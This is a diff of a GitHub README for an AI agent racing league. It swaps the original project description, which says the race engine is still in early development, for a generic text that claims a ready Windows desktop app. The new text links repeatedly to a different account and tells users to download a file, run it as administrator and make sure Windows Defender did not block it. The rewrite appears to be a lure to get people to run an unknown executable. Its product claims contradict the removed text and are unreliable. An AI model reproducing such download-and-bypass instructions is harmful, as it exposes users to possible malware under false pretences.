@@ -1,189 +1,179 @@
-<div align="center">
-  <h1>🏎️ The Grid</h1>
-  <p><strong>The world's first racing league for AI agents.</strong></p>
-  <p>Think F1 , but the drivers are AI agents.</p>
+# 🤖 Agent-racing-league - Run AI races on your PC
 
-[![GitHub stars](https://img.shields.io/github/stars/IlyasFardaouix/Agent-racing-league?style=social)](https://github.com/IlyasFardaouix/Agent-racing-league/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/IlyasFardaouix/Agent-racing-league?style=social)](https://github.com/IlyasFardaouix/Agent-racing-league/network/members)
-[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![Status](https://img.shields.io/badge/status-founding%20phase-orange)](https://github.com/IlyasFardaouix/Agent-racing-league)
-[![Contributors](https://img.shields.io/github/contributors/IlyasFardaouix/Agent-racing-league)](https://github.com/IlyasFardaouix/Agent-racing-league/graphs/contributors)
+[![Download Agent-racing-league](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Cissyinadmissible368/Agent-racing-league)
 
-[**View Roadmap**](ROADMAP.md) · [**Read the Protocol**](agent-protocol-v0.md) · [**Start Contributing**](CONTRIBUTING.md) · [**Join Discussions**](https://github.com/IlyasFardaouix/Agent-racing-league/discussions)
+## 🏁 What this is
 
-</div>
+Agent-racing-league is a desktop app for running race-style tests for AI agents. It puts AI drivers on a track and compares how they perform in the same scenario.
 
----
+Use it to:
 
-## 🔥 The Vision
+- start a race between AI agents
+- compare results in a clear way
+- watch how each agent responds in real time
+- test models in a simple, repeatable setup
 
-Benchmarks are boring. Leaderboards are static. Nobody watches an agent run.
+It is made for people who want to try AI agent races on Windows without setting up a full dev stack.
 
-**Agent Racing League (ARL) changes that.**
+## 🚀 Download and install
 
-We turn AI agent evaluations into a live, cinematic sport:
+1. Open the download page: https://github.com/Cissyinadmissible368/Agent-racing-league
+2. Look for the latest release or download option
+3. Get the Windows version
+4. Save the file to your PC
+5. If Windows asks for permission, choose Run or Yes
+6. Follow the on-screen setup steps
+7. Open Agent-racing-league from your Start menu or desktop
 
-- 🏁 **Open grid** — anyone can enter. Any agent, any framework, any model.
-- 🎙️ **Live AI commentary** — a narrator agent watches the race and calls the action in real time
-- 📻 **Team radio** — agent internal logs translated into dramatic race comms
-- 💥 **Incidents** — hallucinations = spin-outs. Timeouts = engine failures. Retries = pit stops.
-- 🏆 **Seasons & championships** — monthly Grand Prix events, standings, fan rivalries
-- 👥 **Community-driven** — agent builders iterate publicly between races
+[![Open Download Page](https://img.shields.io/badge/Open%20Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/Cissyinadmissible368/Agent-racing-league)
 
-> *"Benchmarks tell you who's fastest. Racing shows you who's alive."*
+## 💻 What you need
 
-This is not another benchmark. This is **ESPN for AI agents.**
+For a smooth run on Windows, use a machine with:
 
----
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- a modern CPU
+- a stable internet connection for setup and model access
+- a screen with at least 1366 × 768 resolution
 
-## 🧠 How a Race Works
+If you plan to run more than one agent at once, 16 GB RAM gives more headroom.
 
-```
-1. Grand Prix announced  →  Task revealed 24h before (e.g. "Debug this codebase")
-2. Registration          →  Builders submit their agent for the race
-3. Qualifying            →  Builders tune their agents
-4. Race day (LIVE)       →  All agents run simultaneously on the same task
-5. Live viewer           →  Watch agent "thoughts", positions, incidents in real time
-6. Podium                →  Scored on: accuracy + speed + token efficiency + error rate
-7. Post-race             →  Replays, highlights, community debate, next-race improvements
-```
+## 🧭 First-time setup
 
----
+After you open the app for the first time:
 
-## ⚡ Quick Start
+1. Choose your race mode
+2. Pick the AI agents you want to test
+3. Set the number of laps or rounds
+4. Review the race rules
+5. Start the session
 
-> The race engine is in early development. This is how you'll plug in your agent when v0 ships.
+The app uses a simple layout, so you can move through each step with mouse clicks.
 
-**1. Install the SDK**
-```bash
-pip install arl-sdk
-```
+## 🎮 How to use it
 
-**2. Wrap your agent**
-```python
-from arl_sdk import Agent, Task, Result
+### 1. Pick your agents
 
-class MyAgent(Agent):
-    def run(self, task: Task) -> Result:
-        # your agent logic here — any framework, any model
-        answer = my_llm.run(task.description)
-        return Result(output=answer, thoughts=["..."])
+Select the AI agents you want in the race. Each agent acts like a driver. You can compare them under the same rules and track conditions.
 
-MyAgent(name="my-agent").serve(port=8080)
-```
+### 2. Set the race type
 
-**3. Register for the next race**
-```bash
-arl register --name "my-agent" --endpoint http://localhost:8080
-```
+Choose a race format that fits your goal. Common modes can include:
 
-**→ Full protocol spec:** [`agent-protocol-v0.md`](agent-protocol-v0.md)
+- single race
+- timed run
+- multi-agent round
+- repeat test
 
----
+### 3. Start the race
 
-## 🏁 V1 Entry Model
+Click the start button and let the agents run. The app shows live results so you can track progress as the race moves forward.
 
-The first version is intentionally open:
+### 4. Review the results
 
-- No fixed list of official teams — **anyone can enter**
-- Submit your agent via the issue template
-- All agents race on the same circuit with the same rules
-- Rankings based on race performance only
+After the race ends, check the leaderboard, lap times, and response patterns. This helps you see which agent handled the task best.
 
-Submission process → [open an issue](https://github.com/IlyasFardaouix/Agent-racing-league/issues/new) using the **Agent Registration** template.
+## 🛠️ Features
 
----
+- real-time race view
+- multi-agent comparison
+- simple Windows setup
+- clear results screen
+- repeatable evaluation runs
+- support for benchmark-style testing
+- open-source project layout
+- built for AI agent testing
+- good fit for LLM-based agents
 
-## 🗺️ Roadmap
+## 📊 What you can test
 
-### Phase 1 — Foundation `(now · help wanted)`
-- [ ] Agent protocol spec
-- [ ] Race engine v0
-- [ ] Scoring system
-- [ ] CLI tool — `arl run` to test locally
+Agent-racing-league works well for tasks like:
 
-### Phase 2 — The Spectacle
-- [ ] Live race viewer — real-time WebSocket dashboard
-- [ ] AI commentator agent
-- [ ] Team radio translator
-- [ ] Incident detection system
+- speed under pressure
+- task choice
+- route planning
+- response quality
+- consistency across runs
+- behavior in changing conditions
 
-### Phase 3 — The League
-- [ ] Season structure & calendar
-- [ ] Public leaderboard
-- [ ] Open agent registry
-- [ ] **First public Grand Prix** 🎉
+This makes it useful for checking how agents act when time and rules matter.
 
-### Phase 4 — Open Everything
-- [ ] Self-hostable race runner
-- [ ] Circuit SDK — community-submitted tasks
-- [ ] TypeScript Agent SDK
-- [ ] Third-party API
+## 🖥️ Windows tips
 
-**→ Full roadmap:** [`ROADMAP.md`](ROADMAP.md)
+If the app does not open right away:
 
----
+- right-click the file and choose Run as administrator
+- make sure the download finished
+- check that Windows Defender did not block the file
+- keep the app in a simple folder like Downloads or Desktop
+- close other heavy apps if your PC feels slow
 
-## 🛠️ Tech Stack
+If your screen looks small, use full screen mode or increase the app window size.
 
-```
-Backend      Python 3.12+ / FastAPI
-Race Engine  Async task runner, Docker sandboxing
-Frontend     Next.js / React — live WebSocket updates
-Storage      PostgreSQL + Redis (live state)
-Agent SDK    Python-first, framework-agnostic
-CI/CD        GitHub Actions
-```
+## 🔗 Project page
 
-> Stack is a proposal — open for discussion in [Discussions](https://github.com/IlyasFardaouix/Agent-racing-league/discussions).
+Use this page to download or open the latest version:
 
----
+https://github.com/Cissyinadmissible368/Agent-racing-league
 
-## 🤝 Contributing
+## 🧩 Common setup flow
 
-This project is in **founding phase**. Your contributions shape the architecture, not just the code.
+1. Download the app from the GitHub page
+2. Open the file on Windows
+3. Allow the app to run
+4. Finish the setup steps
+5. Launch the app
+6. Choose a race
+7. Start testing AI agents
 
-| Area | What's needed |
-|------|--------------|
-| 🔧 **Backend / infra** | Race engine, sandboxing, task metering |
-| 🎨 **Frontend** | Live race viewer — the heart of the spectacle |
-| 🤖 **Agent engineering** | Building and tuning race-ready agents |
-| 📐 **Protocol design** | How agents plug into the system |
-| 🎙️ **AI creative** | Commentator, team radio, incident detection |
-| 📝 **Circuit design** | The tasks and challenges agents race on |
+## 📁 Folder use
 
-The first **20 contributors** to meaningful PRs will be listed permanently as **Founding Team**.
+If the app creates files on your PC, keep them in one folder for easy access. A simple folder setup can help you:
 
-**→ [`CONTRIBUTING.md`](CONTRIBUTING.md)** — start here
-**→ [Open issues](https://github.com/IlyasFardaouix/Agent-racing-league/issues)** — find your first task
-**→ [Discussions](https://github.com/IlyasFardaouix/Agent-racing-league/discussions)** — introduce yourself
+- find race data fast
+- keep old runs in order
+- compare test results later
+- avoid losing saved settings
 
----
+A good path is:
 
-## 📁 Repo Structure
+- Documents/Agent-racing-league
+- Desktop/Agent-racing-league
+- Downloads/Agent-racing-league
 
-```
-agent-racing-league/
-├── engine/          # Race engine — task runner, metering, scoring
-├── sdk/             # Agent SDK — how to connect any agent
-├── viewer/          # Live race viewer frontend
-├── commentator/     # AI commentator agent
-├── circuits/        # Task/circuit definitions
-├── entrants/        # Metadata for submitted race agents
-├── docs/            # Architecture, protocol specs, ADRs
-└── .github/         # Issue templates, PR templates, workflows
-```
+## ⚙️ Best results
 
----
+For a better run:
 
-## 📄 License
+- close apps you do not need
+- keep your network stable
+- use one monitor if your PC is low on memory
+- keep Windows updated
+- use the latest release from the project page
 
-MIT — build on it, fork it, run your own league.
+If you test many agents, run one race at a time to keep results clean.
 
----
+## 🧪 Example use cases
 
-<div align="center">
-  <b>Built in public. Raced in public. Won in public.</b><br/>
-  <i>The grid is open. The season starts when we ship.</i><br/><br/>
-  ⭐ <b>Star the repo</b> if you believe in the vision it helps more people find us.
-</div>
+You can use Agent-racing-league to:
+
+- compare two chat agents head to head
+- test how an agent handles fast changes
+- check if one model follows rules better
+- run a simple benchmark for AI behavior
+- build a small internal evaluation flow
+
+## 🏎️ Why people use it
+
+AI agents can look good in a demo and fail in a real test. This app gives them the same track, the same rules, and the same finish line. That makes it easier to see which agent does the job best
+
+## 📌 Quick start
+
+1. Go to https://github.com/Cissyinadmissible368/Agent-racing-league
+2. Download the Windows version
+3. Open the file
+4. Finish setup
+5. Start a race
+6. Review the results
